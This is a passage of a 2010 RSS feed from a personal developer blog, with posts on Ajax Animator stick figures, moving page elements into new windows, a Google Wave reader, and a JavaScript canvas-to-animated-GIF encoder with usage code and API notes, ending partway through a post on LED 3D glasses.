      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Stick%20Figures!/Screenshot.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Stick%20Figures!/Screenshot.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;Ubuntu’s weird and adding a bar on top of all my screenshots&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/ajaxanimator/VectorEditor/stickfigure.html&quot;&gt;http://antimatter15.com/ajaxanimator/VectorEditor/stickfigure.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I like stick figures, and browsing YouTube, I found some things on Pivot and Pencil (really awesome free desktop animation apps), and that made me think, Stick figures are awesome. So I’m going to add some better Stick Figure features into Ajax Animator and possibly upstream to VectorEditor eventually.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Moving an element to a new window</title>
      <link>http://antimatter15.com/2010/02/moving-an-element-to-a-new-window/</link>
      <pubDate>Sat, 06 Feb 2010 05:43:06 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/02/moving-an-element-to-a-new-window/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Moving%20an%20element%20to%20a%20new%20window/Screenshot1.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Moving%20an%20element%20to%20a%20new%20window/Screenshot1.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Web interfaces right now are either multi-window by design (and only multi-windowed), which aren’t that common and are pretty annoying some times. Most of the time, it’s single windowed, and all the document elements are constrained to a single web page. The problem with this, is that it’s a lot less flexible, I can’t have, for instance, for the ajax animator, I wouldn’t be able to have the tools on the very left side, the timeline on the bottom, a web browser pointing at my RSS in between and the canvas on my second monitor (Not really a functional arrangement, but multiple monitors is a biggie). Even cooler, would be to have it all synchronized using Comet or WebSocket and having part of the interface on a separate device. For devices with smaller displays, like netbooks, I would imagine having a web application to seamlessly move the tools and preference panes to a, for instance, iPhone screen, would be awesome.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jsbin.com/orida/30&quot;&gt;http://jsbin.com/orida/30&lt;/a&gt; is a tiny prototype where a new window can be created, and an element, along with event handlers (though only for a root node) gets moved into the new window with a reference to the first window.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Wave Reader 5.7</title>
      <link>http://antimatter15.com/2010/02/wave-reader-5-7/</link>
      <pubDate>Wed, 03 Feb 2010 04:01:04 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/02/wave-reader-5-7/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/read/?googlewave.com!w+3GAB17WQG&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Wave%20Reader%205.7/screenshot_031.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Wave Reader 5.7&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/read/?googlewave.com!w+3GAB17WQG&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Wave%20Reader%205.7/screenshot_032.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Wave Reader Footer&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Wave Reader 4.6 - Insanely Fast Edition</title>
      <link>http://antimatter15.com/2010/01/wave-reader-4-6-insanely-fast-edition/</link>
      <pubDate>Thu, 14 Jan 2010 06:08:01 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/01/wave-reader-4-6-insanely-fast-edition/</guid>
      <author></author>
      <description>&lt;p&gt;Loading a 500 blip wave in Google’s GWT Client takes 3:34 to get to a usable state (Where the scroll bar works) on a 3ghz Core2 Duo (whose extra core admittedly won’t do much). It also uses 972 MB of RAM.&lt;/p&gt;
&lt;p&gt;Loading the same wave in my Wave Reader, take&lt;strong&gt;s 678 milliseconds. A 315x speed-up&lt;/strong&gt;. Also, my client is totally unoptimized, pure 30KB of javascript. On top of those features, &lt;strong&gt;anyone can view waves&lt;span style=&quot;font-weight: normal;&quot;&gt;, without a google account, &lt;/span&gt;individual blips can be linked &lt;/strong&gt;to, it supports rendering almost everything Wave can, that is &lt;strong&gt;gadgets, inline replies, nesting, &lt;/strong&gt;font color/size, italics, bold, everything you could probably expect. Interestingly, when you add an attachment to Wave, and delete the parent blip, it still stores the attachment on the current wave state, and this client can display/link to them without using Playback. There is an option to &lt;strong&gt;generate plain simple HTML&lt;/strong&gt; for turning a Wave into a standalone page or Website. &lt;strong&gt;Private waves can be exposed read-only as a website&lt;/strong&gt; simply by adding the gwavereader@googlewave.com username.&lt;/p&gt;
&lt;p&gt;Using it is simple, take  a Wave &lt;a href=&quot;https://wave.google.com/wave/#restored:wave:**googlewave.com!w%252Br5lewFqCA**&quot;&gt;https://wave.google.com/wave/#restored:wave:**googlewave.com!w%252Br5lewFqCA**&lt;/a&gt; and then put it after the Wave Reader URL &lt;a href=&quot;http://antimatter15.com/misc/wave/read.html?**googlewave.com!w%252Br5lewFqCA**&quot;&gt;http://antimatter15.com/misc/wave/read.html?**googlewave.com!w%252Br5lewFqCA**&lt;/a&gt;
And magically you have a super awesome URL to link to.&lt;/p&gt;
&lt;p&gt;You can learn some tricks on how to use it to do some more awesome things &lt;a href=&quot;http://antimatter15.com/misc/wave/read.html?googlewave.com!w%252BrnG0vaFXA&quot;&gt;http://antimatter15.com/misc/wave/read.html?googlewave.com!w%252BrnG0vaFXA&lt;/a&gt; such as the before mentioned HTML generation.&lt;/p&gt;
&lt;p&gt;Samples (Some random waves):
&lt;a href=&quot;http://antimatter15.com/misc/wave/read.html?googlewave.com!w%252Br5lewFqCA&quot;&gt;http://antimatter15.com/misc/wave/read.html?googlewave.com!w%252Br5lewFqCA&lt;/a&gt; (New for 4.6 Inline reply support)
&lt;a href=&quot;http://antimatter15.com/misc/wave/read.html?Ze3l0mj0A&quot;&gt;http://antimatter15.com/misc/wave/read.html?Ze3l0mj0A&lt;/a&gt;
&lt;a href=&quot;http://antimatter15.com/misc/wave/read.html?oPg9HfEXE&amp;amp;beta&quot;&gt;http://antimatter15.com/misc/wave/read.html?oPg9HfEXE&amp;amp;beta&lt;/a&gt;
&lt;a href=&quot;http://antimatter15.com/misc/wave/read.html?Mu9eK7j2H&quot;&gt;http://antimatter15.com/misc/wave/read.html?Mu9eK7j2H&lt;/a&gt;
&lt;a href=&quot;http://antimatter15.com/misc/wave/read.html?AhbL5fooD&amp;amp;beta&quot;&gt;http://antimatter15.com/misc/wave/read.html?AhbL5fooD&amp;amp;beta&lt;/a&gt;
&lt;a href=&quot;http://antimatter15.com/misc/wave/read.html?googlewave.com!w+UDMZOGpSG&quot;&gt;http://antimatter15.com/misc/wave/read.html?googlewave.com!w+UDMZOGpSG&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Pure JavaScript HTML5 &lt;canvas&gt; to (Animated) GIF Conversion</title>
      <link>http://antimatter15.com/2010/01/pure-javascript-html5-canvas-to-animated-gif-conversion/</link>
      <pubDate>Sat, 02 Jan 2010 23:53:25 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/01/pure-javascript-html5-canvas-to-animated-gif-conversion/</guid>
      <author></author>
      <description>&lt;p&gt;Based on &lt;a href=&quot;http://code.google.com/p/as3gif/&quot;&gt;as3gif&lt;/a&gt; Ported by &lt;a href=&quot;http://antimatter15.com&quot;&gt;antimatter15&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;This is the raw canvas element saved as a non-animated PNG&quot;  src=&quot;/articles/2010/jsgif/raw_canvas.png&quot; &gt;&lt;/div&gt;
&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;This is the GIF which was generated from the canvas.&quot;  src=&quot;/articles/2010/jsgif/converted_animation.gif&quot; &gt;&lt;/div&gt;
&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;This is the GIF which was generated from the canvas.&quot;  src=&quot;/articles/2010/jsgif/clock.gif&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;AS3GIF lets you play and encode animated GIF’s with ActionScript 3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Since web pages can usually natively play GIFs fine, it’s only a port of the GIFEncoder
portions of the library.&lt;/p&gt;
&lt;h1 id=&quot;basic-usage&quot;&gt;Basic Usage&lt;/h1&gt;
&lt;p&gt;Since it pretty much &lt;em&gt;is&lt;/em&gt; GIFEncoder, you could consult the &lt;a href=&quot;http://code.google.com/p/as3gif/wiki/How_to_use#The_GIFEncoder&quot;&gt;as3gif how-to page&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;But there are some differences so I’ll cover it here anyway.&lt;/p&gt;
&lt;p&gt;You first need to include the JS files. It’s probably best if you include it in this order, but it shouldn’t matter too much.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='handlebars'&gt;&lt;/span&gt;&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;LZWEncoder.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;NeuQuant.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;GIFEncoder.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you want to render the gif through an inline &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag or try to save to disk or send to server or anything that requires
conversion into a non-binary string form, you should probably include &lt;code&gt;b64.js&lt;/code&gt; too.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='handlebars'&gt;&lt;/span&gt;&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;b64.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Simple enough right? Now to convert stuff to GIF, you need to have a working &amp;lt;canvas&amp;gt; or at least some imageData-esque array.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='handlebars'&gt;&lt;/span&gt;&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;canvas&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;bitmap&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;canvas&lt;/span&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; canvas = &lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;hljs-string&quot;&gt;'bitmap'&lt;/span&gt;);
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; context = canvas.getContext(&lt;span class=&quot;hljs-string&quot;&gt;'2d'&lt;/span&gt;);
  context.fillStyle = &lt;span class=&quot;hljs-string&quot;&gt;'rgb(255,255,255)'&lt;/span&gt;;
  context.fillRect(&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;,canvas.width, canvas.height); &lt;span class=&quot;hljs-comment&quot;&gt;//GIF can't do transparent so do white&lt;/span&gt;

  context.fillStyle = &lt;span class=&quot;hljs-string&quot;&gt;&quot;rgb(200,0,0)&quot;&lt;/span&gt;;  
  context.fillRect (&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;75&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;50&lt;/span&gt;);   &lt;span class=&quot;hljs-comment&quot;&gt;//draw a little red box&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now we need to init the GIFEncoder.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='coffeescript'&gt;&lt;/span&gt;  &lt;span class=&quot;hljs-reserved&quot;&gt;var&lt;/span&gt; encoder = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; GIFEncoder();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;em&gt;If&lt;/em&gt; you are making an animated gif, you need to add the following&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='vhdl'&gt;&lt;/span&gt;  encoder.setRepeat(&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;); //&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;  -&amp;gt; &lt;span class=&quot;hljs-keyword&quot;&gt;loop&lt;/span&gt; forever
                        //&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;+ -&amp;gt; &lt;span class=&quot;hljs-keyword&quot;&gt;loop&lt;/span&gt; n times &lt;span class=&quot;hljs-keyword&quot;&gt;then&lt;/span&gt; stop
  encoder.setDelay(&lt;span class=&quot;hljs-number&quot;&gt;500&lt;/span&gt;); //go &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;next&lt;/span&gt; frame every n milliseconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, you need to tell the magical thing that you’re gonna start inserting frames (even if it’s only one).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='dos'&gt;&lt;/span&gt;  encoder.&lt;span class=&quot;hljs-built_in&quot;&gt;start&lt;/span&gt;();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And for the part that took the longest to port: adding a real frame.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='vhdl'&gt;&lt;/span&gt;  encoder.addFrame(&lt;span class=&quot;hljs-keyword&quot;&gt;context&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the GIFEncoder version, it accepts a Bitmap. Well, that doesn’t exist in Javascript (natively, anyway)
so instead, I use what I feel is a decent analogue: the canvas context. However, if you’re in a situation
where you don’t have a real &lt;code&gt;&amp;lt;canvas&amp;gt;&lt;/code&gt; element. That’s &lt;em&gt;okay&lt;/em&gt;. You can set the second parameter to true and
pass a imageData.data-esque array as your first argument. So in other words, you can do &lt;code&gt;encoder.addFrame(fake_imageData, true)&lt;/code&gt;
as an alternative. However, you &lt;em&gt;must&lt;/em&gt; do an &lt;code&gt;encoder.setSize(width, height);&lt;/code&gt; before you do any of the addFrames if you
pass a imageData.data-like array. If you pass a canvas context, then that’s all okay, because it will automagically do a 
setSize with the canvas width/height stuff.&lt;/p&gt;
&lt;p&gt;Now the last part is to finalize the animation and get it for display.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='coffeescript'&gt;&lt;/span&gt;  encoder.finish();
  &lt;span class=&quot;hljs-reserved&quot;&gt;var&lt;/span&gt; binary_gif = encoder.stream().getData() &lt;span class=&quot;hljs-regexp&quot;&gt;//&lt;/span&gt;notice &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; different from the as3gif package!
  &lt;span class=&quot;hljs-reserved&quot;&gt;var&lt;/span&gt; data_url = &lt;span class=&quot;hljs-string&quot;&gt;'data:image/gif;base64,'&lt;/span&gt;+encode64(binary_gif);
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;docs&quot;&gt;Docs&lt;/h1&gt;
&lt;p&gt;Each of the files exposes a single global (see, at least it’s considerate!). But since there’s three files, that means that 
there’s three globals. But two of them are more of supporting libraries that I don’t totally understand or care about enough
to document. So I’m just gonna document GIFEncoder.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;new GIFEncoder()&lt;/code&gt; This is super parent function. You really don’t need the &lt;code&gt;new&lt;/code&gt; keyword because It’s not really even using
any special inheritance pattern. It’s a closure that does some &lt;code&gt;var blah = exports.blah = function blah(){&lt;/code&gt; for no good reason.
Anyway, it returns an object with a bunch of methods that the section will be devoted to documenting. Note that I’ve never tested
more than half of these, so good luck.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Boolean start()&lt;/code&gt; This writes the GIF Header and returns &lt;code&gt;false&lt;/code&gt; if it fails.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Boolean addFrame(CanvasRenderingContext2D context)&lt;/code&gt; This is the magical magic behind everything. This adds a frame.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Boolean addFrame(CanvasPixelArray image, true)&lt;/code&gt; This is the magical magic behind everything. This adds a frame. This time you need 
you pass &lt;code&gt;true&lt;/code&gt; as the second argument and then magic strikes and it loads your canvas pixel array (which can be a real array, I dont
care and I think the program has learned from my constant apathy to also not care). But note that if you do, you must first manually call
&lt;code&gt;setSize&lt;/code&gt; which is happily defined just below this one.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;void setSize(width, height)&lt;/code&gt; Sets the canvas size. It’s supposed to be private, but I’m exposing it anyway. Gets called automagically
as the size of the first frame if you don’t do that crappy hacky imageData.data hack.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;void setDelay(int milliseconds)&lt;/code&gt; the number of milliseconds to wait on each frame&lt;/p&gt;
&lt;p&gt;&lt;code&gt;void setDispose(int code)&lt;/code&gt; Sets the GIF frame disposal code for the last added frame and any
subsequent frames. Default is 0 if no transparent color has been set, otherwise 2. I have no clue what this means so I just copypasted
it from the actionscript docs.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;void setFrameRate(Number fps)&lt;/code&gt; Sets frame rate in frames per second. Equivalent to &lt;code&gt;setDelay(1000/fps)&lt;/code&gt;. I think that’s stupid.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;void setQuality(int quality)&lt;/code&gt; Sets quality of color quantization (conversion of images to the maximum 256 colors allowed by the 
GIF specification). Lower values (minimum = 1) produce better colors, but slow processing significantly. 10 is the default, and produces 
good color mapping at reasonable speeds. Values greater than 20 do not yield significant improvements in speed. BLAH BLAH BLAH. Whatever&lt;/p&gt;
&lt;p&gt;&lt;code&gt;void setRepeat(int iter)&lt;/code&gt; Sets the number of times the set of GIF frames should be played. Default is 1; 0 means play indefinitely. 
Must be invoked before the first image is added.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;void setTransparent(Number color)&lt;/code&gt; Sets the transparent color for the last added frame and any subsequent
frames. Since all colors are subject to modification in the quantization
process, the color in the final palette for each frame closest to the given
color becomes the transparent color for that frame. May be set to null to
indicate no transparent color.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ByteArray finish()&lt;/code&gt; Adds final trailer to the GIF stream, if you don’t call the finish method the GIF stream will not be valid. &lt;/p&gt;
&lt;p&gt;&lt;code&gt;String stream()&lt;/code&gt; Yay the only function that returns a non void/boolean. It’s the magical stream function which should have been a getter which JS does
support but I didnt’ feel like making it a getter because getters are so weird and inconsistent. Like sure there’s the nice pretty &lt;code&gt;get&lt;/code&gt; thing
but I think IE9/8 doesn’t implement it because it’s non standard or something and replaced it with a hideously ugly blah blah. So Anyway, it’s a function.
It returns a byteArray with three writeByte functions that you wouldn’t care about and a &lt;code&gt;getData()&lt;/code&gt; function which returns a binary string with the GIF.
There’s also a &lt;code&gt;.bin&lt;/code&gt; attribute which contains an array with the binary stuff that I don’t care about.&lt;/p&gt;
&lt;h1 id=&quot;webworkers&quot;&gt;WebWorkers&lt;/h1&gt;
&lt;p&gt;The process isn’t really the fastest thing ever, so you should
use WebWorkers for piecing together animations more than a few frames
long.&lt;/p&gt;
&lt;p&gt;I haven’t actually tried it yet, but here’s some incomplete mock-JS which
should be able to do stuff once you add the boring stuff like serializing
and deserializing the content (actually, i have most of the serializing done
but you have to deserialize that and that’s really the boring part).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='javascript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; frame_index,
    frame_length,
    height, 
    width,
    imageData; &lt;span class=&quot;hljs-comment&quot;&gt;//get it from onmessage&lt;/span&gt;

&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; encoder = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; GIFEncoder(); &lt;span class=&quot;hljs-comment&quot;&gt;//create a new GIFEncoder for every new job&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(frame_index == &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;){
  encoder.start();
}&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;{
  encoder.setProperties(&lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;, &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//started, firstFrame&lt;/span&gt;
}
encoder.setSize(height, width);
encoder.addFrame(imageData, &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;);
&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(frame_length == frame_index){
  encoder.finish()
}
postMessage(frame_index + encoder.stream().getData()) &lt;span class=&quot;hljs-comment&quot;&gt;//on the page, search for the GIF89a to see the frame_index&lt;/span&gt;


&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; animation_parts = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Array&lt;/span&gt;(frame_length);
&lt;span class=&quot;hljs-comment&quot;&gt;//on the handler side:&lt;/span&gt;

&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; worker = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; WebWorker(&lt;span class=&quot;hljs-string&quot;&gt;'blahblahblah.js'&lt;/span&gt;);
worker.onmessage = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(e)&lt;/span&gt;&lt;/span&gt;{
  &lt;span class=&quot;hljs-comment&quot;&gt;//handle stuff, like get the frame_index&lt;/span&gt;
  animation_parts[frame_index] = frame_data;
  &lt;span class=&quot;hljs-comment&quot;&gt;//check when everything else is done and then do animation_parts.join('') and have fun&lt;/span&gt;
}
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; imdata = context.getImageData(&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;,canvas.width,canvas.height)
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; len = canvas.width * canvas.height * &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;;
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; imarray = [];
&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;; i &amp;lt; len; i++){
  imarray.push(imdata[i]);
}

worker.postMessage(frame_index + &lt;span class=&quot;hljs-string&quot;&gt;';'&lt;/span&gt; + frame_length + &lt;span class=&quot;hljs-string&quot;&gt;';'&lt;/span&gt; + canvas.height + &lt;span class=&quot;hljs-string&quot;&gt;';'&lt;/span&gt; + canvas.width + &lt;span class=&quot;hljs-string&quot;&gt;';'&lt;/span&gt; + imarray.join(&lt;span class=&quot;hljs-string&quot;&gt;','&lt;/span&gt;))
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>LED Inverse Shutter Glasses</title>
      <link>http://antimatter15.com/2010/01/led-inverse-shutter-glasses/</link>
      <pubDate>Sat, 02 Jan 2010 23:53:25 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/01/led-inverse-shutter-glasses/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/LED%20Inverse%20Shutter%20Glasses/inverse-shutter.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/LED%20Inverse%20Shutter%20Glasses/inverse-shutter.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;inverse shutter&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;On New Years Eve, I saw the awesome movie Avatar in IMAX 3D. I noticed how there were 2 projectors (which I knew before, but seeing it is different). I started thinking about how to make 3D work better, and one of the first ideas I had was to use a polarized wheel, sort of like the fast-moving color wheels that are used in single-DMD DLP technology, but with only two states of two different polarizations. Put that over a single projector, and use the normal relatively cheap polarized glasses! After looking into it, I learned that RealD uses basically the same technology (except they have a solid state switcher thingy rather than a color wheel, which I would assume is some superior technology). So I started thinking again, and came up with “LED Inverse Shutter Glasses”, which I’m nowhere near as certain about working.&lt;/p&gt;
&lt;p&gt;LCD Shutter Glasses work by “blindfolding” one eye at a time, allowing a frame from the monitor/tv to be visible by that one eye, and alternating. This allows a different image to be sent to each eye, which our brains can assemble into a 3d image.&lt;/p&gt;
&lt;p&gt;The shutter glasses are pretty expensive though (well, in &lt;em&gt;my&lt;/em&gt; eyes (pun not intended) its insanely expensive), ranging from $100 to $200 or more.&lt;/p&gt;
&lt;p&gt;How about inverse shutter glasses (which is a term I made up)? What if instead of darkening one eye, you add light through a side-mounted white LED? Radioshack sells White LEDs for $3 each (and probably you can get it cheaper elsewhere). OLEDs are apparently awesome because of their insanely low response times which are as low as 0.01ms compared to the 2ms LCDs (according to Wikipedia), and I would assume that LEDs are similar (Anything under 8ms, or 120fps should work).&lt;/p&gt;
